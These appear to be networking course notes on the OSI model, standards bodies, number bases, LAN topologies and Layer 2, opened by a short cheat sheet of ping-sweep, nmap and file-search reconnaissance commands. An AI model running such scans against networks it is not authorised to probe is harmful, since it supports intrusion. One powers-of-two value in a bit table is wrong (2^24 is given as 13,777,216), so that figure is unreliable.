
Network Recon
    for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ; done
    fping -g -a 10.1.0.0/24
    nmap -sn 10.0.0.0/24 (was -sP which is now deprecated)
    ss -antp/-l
    find / -name hint* 2>/dev/null
    find / iname *pattern* 2>/dev/null
    
Network Access¶
Lesson Number: 112-CCTC15

Slides¶
Network Access Slides
1.0 Outcomes¶
Explain OSI Layer 1 data communications and technologies
Explain and compare binary, decimal, hexadecimal and base64 formats
Describe LAN topologies and devices
Explain OSI Layer 2 protocols, headers and technologies
Describe LAN technologies and their benefits and hindrances
Explain why and how frames are interpreted by different devices
Identify how switches affect network traffic and the visibility of network traffic by other hosts
Describe MAC addressing
Analyze 802.3 frame headers
Describe the contents of an Ethernet header and frame
Describe an 802.1Q virtual local area network (VLAN) frame and how its frames differ from a standard 802.3 frame
Describe the address resolution protocol (ARP)
Explain man-in-the-middle (MitM) with ARP
Explain VTP with its vulnerabilities
Explain DTP with its vulnerabilities
Explain CDP, FDP and LLDP and the security vulnerabilities
Explain STP with its vulnerabilities
Explain Port Security with its vulnerabilities
Describe VLANS and Security vulnerabilities
This section reinforces network fundamentals for students while allowing instructors to assess the necessary network knowledge for success in later modules. It covers key concepts such as mathematical operations in networking, standard terminology, the OSI and TCP/IP models, network protocols, header construction, and basic routing and switching behaviors. Mastering these fundamentals helps students build a strong foundation for more advanced topics.

Layer 1 (Physical layer) and Layer 2 (Data Link layer) protocols are crucial in cybersecurity, as they underpin network communication and data transmission. Layer 1 governs the physical aspects of networking, such as transmission mediums and signal modulation, while Layer 2 handles data framing, addressing, and error detection. Knowledge of these protocols is vital for securing networks and preventing attacks like cable tampering, MAC address spoofing, ARP poisoning, and VLAN hopping.

Cybersecurity professionals must understand these layers to protect against vulnerabilities that could compromise network integrity or allow unauthorized access. Effective countermeasures include physical security, encryption, and access controls. A solid grasp of Layers 1 and 2 is essential for building a strong cybersecurity defense.



Resources


Instructor Note


1.1 Discuss Networking Standards¶
Networking standards play a crucial role in the realm of information technology, acting as the foundational framework that enables diverse devices and systems to communicate effectively within a network. These standards are essentially a set of guidelines, rules, and conventions that prescribe how data should be transmitted, received, and processed across various networked components. Their significance lies in ensuring interoperability and facilitating seamless communication, fostering a cohesive and efficient networking environment. These standards allow for:

Interoperability:

Networking standards provide a common language and set of protocols that devices and systems must adhere to for effective communication. By establishing a standardized approach to data transmission and reception, these standards enable devices from different manufacturers and developers to work together seamlessly. This interoperability is essential for creating heterogeneous networks where diverse devices, ranging from computers and printers to routers and switches, can collaborate efficiently.
Seamless Communication:

The standards dictate how data is formatted, packaged, and transmitted across the network. This uniformity ensures that devices can understand and interpret the data correctly, promoting smooth communication. Whether it's a file transfer, an email exchange, or a video stream, adherence to networking standards guarantees that the information flows consistently across the network, irrespective of the devices involved.
Structured Framework:

Networking standards often follow a structured framework, such as the OSI model, which divides the networking process into distinct layers. Each layer has a specific function, and adherence to this framework allows for modular design and development. This structured approach simplifies troubleshooting, maintenance, and upgrades as changes can be localized to specific layers without affecting the entire network architecture.
Reliability and Efficiency:

By defining the rules for error detection, correction, and flow control, networking standards contribute to the reliability and efficiency of data transmission. Protocols like TCP (Transmission Control Protocol) ensure the reliable delivery of data, while others, like UDP (User Datagram Protocol), focus on speed and efficiency. These standards strike a balance between reliability and performance based on the specific needs of the applications and services running on the network.
Scalability and Future-Proofing:

Networking standards provide a scalable foundation that accommodates the growth and expansion of networks over time. As technology evolves, new standards emerge to address the changing needs of communication. For example, the transition from IPv4 to IPv6 was driven by the need for a larger address space to accommodate the growing number of devices connected to the Internet. Adherence to standards ensures that networks can evolve and incorporate new technologies seamlessly.
Security:

Many networking standards include security protocols and measures to protect data integrity and confidentiality. Encryption standards, authentication mechanisms, and secure communication protocols contribute to safeguarding sensitive information as it traverses the network. Security standards are critical in today's interconnected world, where cyber threats are a constant concern.


Resources


Instructor Note


1.1.1 OSI Model¶
The Open Systems Interconnection (OSI) Model is a conceptual framework that standardizes the functions of a telecommunication or computing system into seven abstraction layers. It was developed by the International Organization for Standardization (ISO) to facilitate communication and interoperability between different systems and networks. Each layer in the OSI Model performs specific functions, and the model helps in understanding, designing, and discussing network architecture and protocols. Each layer operates independentantly of the other layers but services the other layers.

Discuss the layers of the OSI model starting from the application and down. Explain how typical network traffic like web utilizes each of the 7 layers.



7. Application Layer: provides a network interface to the software applications that communicate over the network. It supports communication services directly to end-users or applications and provides network services such as file transfers, email, and remote login.

Protocols that operate at this layer:
Remote Login: SSH (Secure Shell) and Telnet
Web: HTTP (Hypertext Transfer Protocol) and HTTPs
File Transfer: FTP (File Transfer Protocol), SFTP (SSH FTP), and FTPS (FTP Secure)
Email: SMTP (Simple Mail Transfer Protocol), POP (Post Office Protocol), and IMAP (Internet Message Access Protocol)
6. Presentation Layer: deals with the syntax and semantics of the information exchanged between systems. It translates data between the application layer and the lower layers, ensuring that the data is in a readable format. Tasks include data compression, encryption, and character set conversions. There are no protocols that operate at this layer. This layer deal more with encoding and file formatting.

Character encodings:

ASCII Encoding
Unicode Encoding
UTF-8 Encoding
UTF-16 Encoding
UTF-32 Encoding
Base64 Encoding
URL Encoding
File formats:

Text-Based Formats:

Plain Text (.txt)
Comma-Separated Values (.csv)
Extensible Markup Language (.xml)
JavaScript Object Notation (.json)
Document Formats:

Portable Document Format (.pdf)
Microsoft Word Document (.docx)
Rich Text Format (.rtf)
Image Formats:

Joint Photographic Experts Group (.jpg/.jpeg)
Graphics Interchange Format (.gif)
Portable Network Graphics (.png)
Audio Formats:

MP3 (.mp3)
Waveform Audio File Format (.wav)
Advanced Audio Coding (.aac)
Video Formats:

Moving Picture Experts Group-4 (.mp4)
Audio Video Interleave (.avi)
Flash Video (.flv)
Compression:

Lossless Compression:

Lempel-Ziv (LZ) Compression
DEFLATE Compression
Run-Length Encoding (RLE)
Burrows-Wheeler Transform (BWT)
Huffman Coding
Arithmetic Coding
Bzip2 Compression
Delta Encoding
PPM (Prediction by Partial Matching)
LZMA (Lempel-Ziv-Markov chain Algorithm)
LZ77 and LZ78
Shannon-Fano Coding
Gzip Compression
Zstandard (Zstd)
LZW (Lempel-Ziv-Welch) Compression
CAB (Cabinet File Format)
Lossy Compression:

JPEG Compression
GIF Compression
MPEG Compression
MP3 Compression
AAC (Advanced Audio Coding)
OGG Compression
WebP Compression
HEVC (High-Efficiency Video Coding)
FLAC (Free Lossless Audio Codec)
WAVPACK
DCT (Discrete Cosine Transform) Compression
Encryption:

TLS (Transport Layer Security)
SSL (Secure Sockets Layer)
PGP (Pretty Good Privacy)
S/MIME (Secure/Multipurpose Internet Mail Extensions)
OpenPGP (Open Pretty Good Privacy)
End-to-End Encryption (E2EE)
5. Session Layer: establishes, manages, and terminates communication sessions between applications. It controls dialogues (full-duplex or half-duplex), maintains synchronization, and manages data exchange between applications. Sometimes the protocols that operate at this layer act as a "shim protocol" between various communicating devices.

Protocols that operate at this layer:
NetBIOS (Network Basic Input/Output System)
RPC (Remote Procedure Call)
PPTP (Point-to-Point Tunneling Protocol)
SMB (Server Message Block) can operate like a "shim protocol" between various communicating devices.
SOCKS (Socket Secure)
4. Transport Layer: ensures end-to-end communication, providing error detection, error correction, and flow control. It breaks down larger messages into smaller segments, sends them across the network, and reassembles them at the destination.

Protocols that operate at this layer:
Transmission Control Protocol (TCP): TCP is a connection-oriented protocol that provides reliable and ordered delivery of data packets. It establishes a virtual connection between the sender and receiver, manages packet acknowledgment, retransmission, and flow control to ensure data integrity and delivery. TCP is widely used for applications that require error-free data transmission, such as web browsing, email, and file transfer.
User Datagram Protocol (UDP): UDP is a connectionless protocol that provides fast, but unreliable, delivery of data packets. Unlike TCP, UDP does not establish a connection or guarantee packet delivery, making it faster but less reliable. It is commonly used for real-time communication applications like video streaming, online gaming, and Voice over IP (VoIP), where occasional packet loss is acceptable.
3. Network Layer: is responsible for logical addressing, routing, and forwarding. It enables devices to communicate across different networks by determining the best path for data to travel from the source to the destination. IP (Internet Protocol) and IPv6 operates at this layer.

Protocols that operate at this layer:
Internet Protocol version 4 (IPv4): IPv4 is the most widely used version of the Internet Protocol. It uses 32-bit addresses, allowing for approximately 4.3 billion unique addresses. However, due to the exhaustion of available IPv4 addresses, IPv6 has been developed as its successor.
Internet Protocol version 6 (IPv6): IPv6 is designed to address the limitations of IPv4 by using a 128-bit address space, providing a vastly larger number of possible addresses. It offers improved security, better support for mobile devices, and more efficient routing compared to IPv4.
Internet Control Message Protocol (ICMP): ICMP is used for network diagnostics and error reporting. It allows routers and hosts to communicate error messages, such as "destination unreachable" or "time exceeded," back to the source host.
Internet Group Management Protocol (IGMP): IGMP is used by IPv4 systems to manage multicast group membership. It enables hosts to inform routers about their desire to receive multicast traffic for specific multicast groups.
Neighbor Discovery Protocol (NDP): NDP is used in IPv6 networks for address resolution, router discovery, and neighbor detection. It serves IPV6 in a similar way that Address Resolution Protocol (ARP) performs for IPv4 networks.
2. Data-Link Layer: is responsible for creating a reliable link between two directly connected nodes. It handles issues such as framing, addressing, and error detection. It also manages access to the physical medium and controls how data is placed on the medium.

Protocols that operate at this layer:
Ethernet: Ethernet is the most widely used data link layer protocol. It defines standards for the physical and data link layers, including how data is framed for transmission over Ethernet networks and how devices on the same network share the communication medium. Ethernet uses MAC (Media Access Control) addresses to identify devices on the network.
IEEE 802.11 (Wi-Fi): The IEEE 802.11 standard governs wireless local area network (WLAN) technologies, commonly known as Wi-Fi. It defines how wireless devices communicate with each other over radio frequencies, including protocols for data framing, channel access, and security.
Ethernet VLAN Tagging (IEEE 802.1Q): IEEE 802.1Q is a protocol used to implement virtual LANs (VLANs) on Ethernet networks. It adds a VLAN tag to Ethernet frames, allowing devices to distinguish between different VLANs and route traffic accordingly.
Address Resolution Protocol (ARP): ARP is used to map IP addresses to MAC addresses on a local network. When a device needs to communicate with another device on the same network, it sends an ARP request to discover the MAC address associated with the IP address.
Reverse Address Resolution Protocol (RARP): RARP performs the opposite function of ARP. It maps MAC addresses to IP addresses, typically used by diskless workstations to obtain their IP addresses from a server based on their MAC addresses.
Link Layer Discovery Protocol (LLDP): LLDP is a vendor-neutral protocol used to discover information about neighboring devices on a network. It allows network devices to exchange information about their identity, capabilities, and status.
Cisco Discovery Protocol (CDP): Similar to LLDP, CDP is a proprietary protocol developed by Cisco. It enables Cisco devices to discover and share information about neighboring Cisco devices on a network, including device type, IP address, and software version.
1. Physical Layer: deals with the physical connection between devices. It defines the hardware elements, such as cables, connectors, and the transmission medium (e.g., copper wires, fiber optics). It is concerned with the raw transmission of bits over a physical medium. The protocols define the electrical, mechanical, and functional specifications for transmitting raw bit streams over physical mediums.

Communication standards at this layer:
Ethernet Physical Layer Standards (IEEE 802.3): IEEE 802.3 standards define the physical and electrical characteristics of Ethernet networks. They specify parameters such as cable types (e.g., twisted pair, fiber optic), signaling methods (e.g., Manchester encoding, 4B5B encoding), and data transmission rates (e.g., 10 Mbps, 100 Mbps, 1 Gbps, 10 Gbps).
IEEE 802.11 (Wi-Fi): Wi-Fi is a family of wireless networking standards for local area networks (LANs). It defines physical layer specifications for radio frequency transmission over the air, including modulation techniques, channel widths, and data rates used in Wi-Fi networks.
Bluetooth: Bluetooth is a wireless technology standard for short-range communication between devices. It defines physical layer specifications for radio frequency transmission, including frequency bands, modulation techniques, and power levels used in Bluetooth devices.




Importance of the OSI Model

The OSI model describes networking functions as a set of layered, modular components, each responsible for particular functions. The model is theoretical in nature as certain networking protocols don't always fall nicely within a specific layer. It merely provides a framework for breaking down complex networking components in a way that can be more easily understood. Without the model's structure to help frame the conversation related to protocol interaction and other functions, discussion of networking topics would be nearly impossible.
OSI Layer	PDU	Common Protocols
7 - Application	Data	DNS, HTTP, TELNET
6 - Presentation	Data	SSL, TLS, JPEG, GIF
5 - Session	Data	NetBIOS, PPTP, RPC, NFS
4 - Transport	Segment/Datagram	TCP, UDP
3 - Network	Packet	IP, ICMP, IGMP
2 - Data Link	Frames	PPP, ATM, 802.2, 802.3, Frame Relay
1 - Physical	Bits	Bluetooth, USB, 802.11 (Wi-Fi), DSL, 1000Base-T


Resources


Instructor Note


1.1.2 Internet Standards Organizations¶
Other than the OSI or TCP/IP models, it's also important to understand some other organizations that have been developing Internet and Networking Standards.



Internet Engineering Task Force (IETF): The IETF is a large open international community of network designers, operators, vendors, and researchers who are concerned with the evolution and operation of the Internet. It focuses on the development of protocols and standards, with working groups dedicated to specific areas such as routing, security, and web technologies.

Main focus:

Repository of Request for Comment (RFC) which is a series of documents published by the Internet Engineering Task Force (IETF) and other organizations involved in the development of Internet standards and protocols.
RFCs serve as the primary means for documenting specifications, protocols, procedures, and other technical aspects of the Internet.

Noteable RFCs:

RFC 768 - User Datagram Protocol (1980): This RFC defines the User Datagram Protocol (UDP), a core protocol used for low-latency communications where reliability is not a priority.
RFC 791 - Internet Protocol (1981): This RFC defines IPv4, the fourth version of the Internet Protocol. It's foundational for the functioning of the modern Internet.
RFC 792 - Internet Control Message Protocol (1981): Defines ICMP, used for network diagnostics and error reporting (e.g., echo requests/replies).
RFC 793 - Transmission Control Protocol (1981): Defines TCP, including its connection-oriented features, reliability mechanisms, and flow control.
RFC 826 - Address Resolution Protocol (1982): Defines the Address Resolution Protocol (ARP), which is used to map IP addresses to MAC addresses in a local network.
RFC 854 - Telnet Protocol Specification (1983): Defines the Telnet protocol, which allows remote text-based communication over the Internet.
RFC 959 - File Transfer Protocol (FTP) (1985): Specifies the FTP protocol for transferring files between clients and servers.
RFC 1350 - Trivial File Transfer Protocol (TFTP) (1992): Defines TFTP, a simpler and less feature-rich file transfer protocol compared to FTP.
RFC 1918 - Address Allocation for Private Internets (1996): This RFC defines the private IP address ranges used within internal networks that are not routable on the public Internet.
RFC 1939 - Post Office Protocol - Version 3 (POP3) (1996): Defines POP3, a protocol for retrieving email from a server.
RFC 2131 - Dynamic Host Configuration Protocol (1997): Specifies DHCP for dynamically assigning IP addresses and other network configuration parameters to devices.
RFC 2460 - Internet Protocol, Version 6 (IPv6) Specification (1998): This RFC specifies IPv6, the successor to IPv4, designed to address limitations and exhaustion issues with IPv4.
RFC 3501 - Internet Message Access Protocol (IMAP) (2003): Specifies IMAP, a protocol for accessing and managing email on a server.
RFC 4251 - The Secure Shell (SSH) Protocol Architecture (2006): Describes the architecture of SSH, including its components for secure remote access and file transfer.
RFC 5321 - Simple Mail Transfer Protocol (2008): Defines SMTP for email transmission between servers.


Internet Assigned Numbers Authority (IANA): IANA is responsible for the global coordination of the DNS root, IP addressing, internet numbers, and other Internet protocol resources. While not primarily a standards development organization, IANA's role in managing critical Internet resources is vital to the functioning of the Internet.

Main Focus:
Allocation of IPv4 and IPv6 addresses
Management of Well Know port assignments
Multicast address assignment
Protocol number assignment
Assigns MAC OUI to organizations
Manages assignments of Autonomous System (AS) to organizations
Maintains all the DNS root servers


Regional Internet Registries (RIRs): RIRs, such as ARIN, RIPE NCC, and APNIC, are responsible for the allocation and registration of Internet number resources, including IP addresses. While their primary role is resource allocation, they also contribute to the development and promotion of Internet standards related to addressing and routing.

American Registry for Internet Numbers (ARIN): ARIN serves the United States, Canada, and parts of the Caribbean region. It allocates and manages IP addresses (both IPv4 and IPv6), autonomous system numbers (ASNs), and related resources within its service region.
Réseaux IP Européens Network Coordination Centre (RIPE NCC): RIPE NCC serves Europe, the Middle East, and parts of Central Asia. It allocates and manages IP addresses (IPv4 and IPv6), ASNs, and related resources for its service region.
Asia-Pacific Network Information Centre (APNIC): APNIC serves the Asia-Pacific region, including East Asia, Southeast Asia, South Asia, and Oceania. It allocates and manages IP addresses (IPv4 and IPv6), ASNs, and related resources within its service region.
Latin America and Caribbean Network Information Centre (LACNIC): LACNIC serves Latin America and the Caribbean region. It allocates and manages IP addresses (IPv4 and IPv6), ASNs, and related resources within its service region.
African Network Information Centre (AFRINIC): AFRINIC serves the African continent. It allocates and manages IP addresses (IPv4 and IPv6), ASNs, and related resources within its service region.
Institute of Electrical and Electronics Engineers (IEEE): While the IEEE is a broader organization covering various fields of technology, it plays a significant role in developing standards for networking and communication technologies. The IEEE 802 working groups, for example, have developed standards for LANs and wireless networks.

Some of the standards they deal with:
IEEE 802.11: Wireless LAN standards, commonly known as Wi-Fi, specifying protocols for wireless communication between devices.
IEEE 802.3: Ethernet standards, defining specifications for wired local area network (LAN) communication.
IEEE 802.1Q: Virtual LAN (VLAN) standards, providing protocols for creating and managing virtual LANs within Ethernet networks.
IEEE 802.16: Broadband Wireless Access (BWA) standards, often referred to as WiMAX, for wireless metropolitan area networks (MANs).
IEEE 802.1X: Port-based network access control standards, used for authenticating and authorizing devices connecting to a LAN or WLAN.
IEEE 802.1ad: Provider Bridging (PB) standards, also known as "Q-in-Q," for implementing virtual LAN (VLAN) stacking in Ethernet networks.


Organization	Website	What they are known for:
IETF	IETF Standards	Mostly known for developing and publishing "white paper" standards known as Request for Comment (RFC).
Some notable ones are:
* IPv4 791
* IPv6 2460
* TCP 793
* UDP 768
* HTTP 1.1 2616
* List of others from Wikipedia
IANA	https://www.iana.org/	Controls all internet numbers such as:
* MAC OUI Numbers
* Ethertypes
* IPv4 and IPv6 addresses
* IPv4 and IPv6 Multi-cast addresses
* Protocol Numbers
* Port Numbers
* 16/32-bit AS Numbers
* Domain Names Root
* ARP Operation Codes
IEEE	IEEE Official
IEEE Wikipedia
IEEE Standards from Wikipedia	Most notably they developed standards for Local Area Networks (802 series) such as:
* 802.1 - LAN and WAN bridging and security
* 802.2 - LLC sub-layer
* 802.3 - Ethernet (CSMA/CD)
* 802.11 - Wireless LAN
* 802.15 - Wireless PAN


Resources


Instructor Note


1.2 Explain OSI Layer 1 data communications and technologies¶
Layer 1 or the physical layer is responsible for the transmission and reception of unstructured raw data between a device and a physical transmission medium (twisted-pair cable, coaxial cable, and fiber-optic cable). It converts the digital bits into electrical, radio, or optical signals. Layer specifications define characteristics such as voltage levels, the timing of voltage changes, physical data rates, maximum transmission distances, modulation scheme, channel access method and physical connectors. This includes the layout of pins, voltages, line impedance, cable specifications, signal timing and frequency for wireless devices. Bit rate control is done at the physical layer and may define transmission mode as simplex, half duplex, and full duplex. The components of a physical layer can be described in terms of network interface cards (NICs), connectors and interfaces, and cables that facilitate the transmission of data from source to destination. Physical layer specifications are included in the specifications for the ubiquitous Bluetooth, Ethernet, and USB standards.

The physical layer is the lowest layer of the OSI model, it is where data is physically sent across the network as ones and zeros. Additionally, voltage levels, data rates, maximum transmission distance, and physical connections are defined at the physical layer. The devices that exist at this layer do not have knowledge of the contents of messages being sent across, they simply take the input bits and re-transmit them as output bits.



Resources


Instructor Note


1.2.1 Explain and compare Binary, Decimal, Hexadecimal and Base64 formats¶
There must be an understanding of fundamental number conversions and math that occurs in networking before moving on to more advanced topics involving headers.



Resources


Instructor Note


1.2.1.1 Binary¶
Binary (Base 2) Used internally by nearly all computers, is base 2. Uses two symbols which are 0 and 1, expressed from switches displaying OFF and ON respectively.

Depending on its place value (as it moves right to left) it will have an incremental value of the powers of 2. (i.e. 20=1, 21=2, 22=4, 23=8, 24=16, etc.).
Common Format

Base 2 - Lowest level format and is the base language used by computer systems. Uses a series of 0 and 1 in groupings of 8-bits or 1 byte.
01000010 01100001 01110011 01100101 00100000 00110010
Representation of binary information:

Bits=1, Nibbles=4-bits, Bytes=8-bits, etc.
The bit is a binary representation of the smallest set of information in a computer.
A collection of these bits must be used to store large amounts of information.
The most common groupings and associated terms are listed below:


Bit - The most basic unit of information in computing and digital communications.

Values of a bit can vary greatly depending on which 'powers of 2' position its holding.
The name is a contraction of binary digit.
The bit represents a logical state with one of two possible values.
These values are most commonly represented as either 1 or 0, but other representations such as true/false, yes/no, +/−, or on/off are common.
Nibble - is a four-bit aggregation, or half an octet. It is also known as half-byte or tetrade.

The decimal values of each nibble (hex) can vary depending on whether it's in the high-order or low-order.
Low-order can be from 0x00 (0) to 0x0F (15)
High-order can be in incremental sums of 0x10 (16), 0x20 (32), 0x40 (64) and 0x80 (128) or from 0x00 (0) to 0xF0 (240).
In a networking or telecommunication context, the nibble is often called a semi-octet, quadbit, or quartet.
A nibble has sixteen possible values (0-15 or rather 0-9 and A-F). A nibble can be represented by a single hexadecimal digit and called a hex digit.
A full byte (octet) is represented by two hexadecimal digits; therefore, it is common to display a byte of information as two nibbles.
Sometimes the set of all 256 byte values is represented as a 16×16 table, which gives easily readable hexadecimal codes for each value.
Decimal	128	64	32	16	8	4	2	1
HEX	8	4	2	1	8	4	2	1
High Nibble	1	1	1	1				
Low Nibble					1	1	1	1
Byte - A unit of digital information that most commonly consists of eight bits.
Values that can be achieved are 0 to 255 or 0x00 to 0xFF.
Historically, the byte was the number of bits used to encode a single character of text in a computer and for this reason it is the smallest addressable unit of memory in many computer architectures.
To disambiguate arbitrarily sized bytes from the common 8-bit definition, network protocol documents such as The Internet Protocol (RFC 791)(1981) refer to an 8-bit byte as an octet.
Those bits in an octet are usually counted with numbering from 0 to 7 or 7 to 0 depending on the endianness. The first bit is number 0, making the eighth bit number 7.
27	26	25	24	23	22	21	20
128	64	32	16	8	4	2	1
Halfword - a unit of digital addressable information in a grouping of 2 (combined) bytes (16-bits).
Values can range from 0x0000 (0) to 0xFFFF (65,535).
215	214	213	212	211	210	29	28	.	27	26	25	24	23	22	21	20
32768	16384	8192	4096	2048	1024	512	256	.	128	64	32	16	8	4	2	1
Word - a unit of digital addressable information in a grouping of 4 (combined) bytes (32-bits).
Values can range from 0x00000000 (0) to 0xFFFFFFFF (4,294,967,295).
In computers, "WORD" is the native size of data that you use to read the data.
With IPv4, the "WORD" is in 32-bit size chunks.
231	230	229	228	227	226	225	224	.	223	222	221	220	219	218	217	216	.	215	214	213	212	211	210	29	28	.	27	26	25	24	23	22	21	20
2,147,483,648	1,073,741,824	536,870,912	268,435,456	134,217,728	67,108,864	33,554,432	13,777,216	.	8,388,608	4,194,304	2,097,152	1,048,576	524,288	262,144	131,072	65536	.	32768	16384	8192	4096	2048	1024	512	256	.	128	64	32	16	8	4	2	1


Resources


Instructor Note


1.2.1.2 Decimal¶
Decimal (Base 10)

The most used system of numbers in the world, is used in arithmetic. Uses ten symbols which are "0–9". Like binary it's place value will increment by the powers of 10 as it moves from right to left.
Common Format

Base 10 - Basis for the numbering system used by humans.
Place values are powers of 10. (100=1, 101=10, 102=100, 103=1000, etc. )
66, 97, 115, 101, 32, 49, or 48
105	104	103	102	101	100
100000	10000	1000	100	10	1


Resources


Instructor Note


1.2.1.3 Hexadecimal¶
Hexadecimal (Base 16)

Often used in computing as a more compact representation of binary (1 hex digit per 4 bits).
The sixteen digits are "0–9" followed by "A–F" or "a–f".
A = 10, B = 11, C = 12, D = 13, E = 14, F = 15.
It's place values are 8, 4, 2, or 1 as it moves from left to right.
The combination of these 4 bits will give you the values of the HEX digits ( 0-15 or 16 total).
Common Format

Base 16 - Used by computers and humans to express larger decimal numbers or long streams of binary into more manageable groupings.
0x42 0xE3 0x73 0xA5 0x20 0x31 0x2B
HEX	8	4	2	1	8	4	2	1
Decimal	128	64	32	16	8	4	2	1




Resources


Instructor Note


1.2.1.4 Decimal to Hexadecimal Conversion¶
When converting Decimal to Hexadecimal (or converting Hexadecimal to Decimal) it is easiest to convert to 8-bit, 16-bit, or 32-bit binary first.

Convert from Decimal to Hex

Convert the decimal number to its binary equivalent.
0 - 255 will be contained within 1 byte
256 - 65,535 will be contained within 2 bytes.
65,536 - 4,294,967,296 will be contained within 4 bytes.
Split the byte(s) into 4-bit nibbles with values of 8, 4, 2, and 1 for each nibble.
1 byte will have 2 nibbles, 2 bytes with have 4 nibbles, and 4 bytes will have 8 nibbles.
Convert the values of each 4-bit nibble back into decimal
Each nibble of 4 bits will give you a value from 0 to 15.
10 = A, 11 = B, 12 = C, 13 = D, 14 = E, and 15 = F
Order each hexadecimal digit in order from left to right.
The symbol of 0x is placed in front of the value to designate it as a hexidecimal number.
Convert from Hex to Decimal

Align each Hex digit to the bit chart
2 Hex to 1-byte, 4 Hex to 2-bytes, 8 hex to 4-bytes.
The leftmost Hex will align with the High order bits while the rightmost Hex will align with the lowest-order bits.
Convert each Hex to its decimal equivalent.
A = 10, B = 11, C = 12, D = 13, E = 14, F = 15
Convert each decimal to its binary equivalent and place into each 4-bit nibble.
Add up all the bits that are turned on.
1 byte will return values from 0 - 255
2 bytes will return values from 256 - 65,535
4 bytes will return values from 65,536 - 4,294,967,296
HEX Coversion Chart for 1-byte.



One Byte Decimal to/from Hex Conversion.



Two Byte Decimal to/from Hex Conversion.



Four Byte Decimal to/from Hex Conversion.





Resources


Instructor Note


1.2.1.5 Base64¶
Tetrasexagesimal (Base 64)

This system is conveniently coded into ASCII by using the 26 letters of the Latin alphabet in both upper and lower case (52 total) plus 10 numerals (62 total) and then adding two special characters
Common Format

Base 64 - Like HEX, it allows groupings up to 6-bits of binary (0-63 decimal).
Characters used are (A-Z), (a-z), (0-9), and (+, /). That is (26) + (26) + (10) + (2) respectively.
In order to be compatible with binary, it uses 4 groupings of 6-bits (24 total bits) so that it will equate to 3 bytes of binary ( 24 bits).
For data not consuming the full 24-bits, it will use "=" signs for each 6 unused bits at the end as padding. Not more than 2 "=" will be used.
MTI=, MTIzNA==, MTIzNDU2Nzg=, QmFzZSA2NA==
25	24	23	22	21	20		25	24	23	22	21	20		25	24	23	22	21	20		25	24	23	22	21	20
32	16	8	4	2	1		32	16	8	4	2	1		32	16	8	4	2	1		32	16	8	4	2	1


Chart depicts the 6-bit Binary equivalent to each HEX Character.





Resources


Instructor Note


1.2.2 Describe LAN topologies and devices¶
LAN (Local Area Network) topologies refer to the physical or logical layout of devices and connections within a local network. We will discuss the common topology types.



Resources


Instructor Note


1.2.2.1 Topologies¶
Bus
A bus network is a network topology in which nodes are directly connected to a common half-duplex link called a bus.


Star
A star network is an implementation of a spoke–hub distribution paradigm in computer networks. In a star network, every host is connected to a central hub. In its simplest form, one central hub acts as a conduit to transmit messages.


Ring
A ring network is a network topology in which each node connects to exactly two other nodes, forming a single continuous pathway for signals through each node – a ring. Data travels from node to node, with each node along the way handling every packet.


Mesh
A mesh network is a local network topology in which the infrastructure nodes (i.e. bridges, switches, and other infrastructure devices) connect directly, dynamically and non-hierarchically to as many other nodes as possible and cooperate with one another to efficiently route data from/to clients. This lack of dependency on one node allows for every node to participate in the relay of information. Mesh networks dynamically self-organize and self-configure, which can reduce installation overhead. The ability to self-configure enables dynamic distribution of workloads, particularly in the event a few nodes should fail. This in turn contributes to fault-tolerance and reduced maintenance costs.


Wireless
A wireless network is a computer network that uses wireless data connections between network nodes. Note: All wireless connections eventually connect to a wired network.


Hierarchical
The hierarchical topology model is made up of the following:
A core layer of high-end switches optimized for network availability and performance.
A distribution layer of switches implementing forwarding decisions.
An access layer connecting users via hubs, bridges, or switches.




Resources


Instructor Note


1.2.2.2 Devices¶
Hubs are devices that allow multiple nodes to connect on the same wire (Collision Domain).

Switches are devices that allow multiple nodes to connect on the network, but on their own collision domain. The layer 2 originating MAC address of the frame are learned from the incoming frames and are stored in the mac address table memory, also called a Content Addressable Memory (CAM) table.

Repeaters are devices that allow a connection to be extended beyond the normal operational cable or wireless limits.



Resources


Instructor Note


1.2.2.3 Ethernet Timing¶
Ethernet timing refers to the synchronization mechanisms used in Ethernet networks to ensure proper transmission and reception of data frames.

Bit Time - is the period of time is required for a bit to be placed and sensed on the media.
Network speeds are measured by how many bits can be placed or sensed on the media in 1 second.
Each increase in speed requires more bits to be sent during the same 1 second internal.
To accomplish this the bit-times are reduced.
Speed	Bit-time
10 Mbps	100ns
100 Mbps	10ns
1 Gbps	1ns
10 Gbps	.1ns
100 Gbps	.01ns


Resources


Instructor Note


1.3 Explain OSI Layer 2 protocols, headers and technologies¶
Layer 2 of the OSI (Open Systems Interconnection) model, also known as the Data Link Layer, is responsible for the efficient and reliable transfer of data between adjacent nodes on a network segment. Layer 2 protocols, headers, and technologies operate at this layer to facilitate communication within the local network.



Resources


Instructor Note


1.3.1 Describe LAN technologies and their benefits and hindrances¶
LAN (Local Area Network) technologies are used to connect devices within a limited geographical area, such as a home, office, or campus.There are many LAN technologies in use today. These technologies are mostly governed by IEEE standards such as:

Technology	Standard(s)	Advantages	Disadvantages
Ethernet	IEEE 802.3, 802.3u, 802.3z, 802.3ae, 802.3de	Low cost	
Easy to install maintain and troubleshoot
Fast and consistent data transfer speed
Logical Link Control (LLC)	IEEE 802.2	
Ensures interoperability across devices from different manufacturers.
Allows multiple protocols to use the same network medium.
Adds extra layers of logic and control to the network.
Introduces processing and transmission overhead.
Wireless	IEEE 802.11 (WI-Fi 0), 802.11b (Wi-Fi 1), 802.11a (Wi-Fi 2), 802.11g (Wi-Fi 3), 802.11n (Wi-Fi 4), 802.11ac (Wi-Fi 5), 802.11ax (Wi-Fi 6), 802.11be (Wi-Fi 7)	
No cables
Easy install and deployment
Network interferance
Traffic in the open
Authentication needed
Slow and inconsistent data transfer speed
Half Duplex communications
Token Ring	IEEE 802.5	
Fair access for all nodes
Eliminates collisions of contention-based access methods
More complex compared to Ethernet
NOTE: This course will be focusing on Ethernet.



Resources


Instructor Note


1.3.2 Data Link Sub-layers¶
Data link layer is unique because it has the function to communicate in "logical" and "physical". To accommodate this the functionality of this layer is divided into two logical sub-layers. An upper sub-layer, LLC, to interact with the network layer above and a lower sub-layer, MAC, to interact with the physical layer.

Media Access Control (MAC):
The MAC Sub-layer is not to be confused with MAC address.
The MAC sub-layer is responsible for controlling access to the physical transmission medium.
Handles the transmission and reception of data frames over the physical medium, including addressing, framing, and error checking.
Act as a sublayer governing protocol access to the physical medium, physical addressing, and acts as an interface between the LLC and physical layer. Most of the frame construction happens at this layer.
Provides the destination MAC address.
Either a broadcast (FF:FF:FF:FF:FF:FF) to address all nodes on LAN.
Unicast MAC (4A:30:10:19:10:1A) to address one node on LAN.
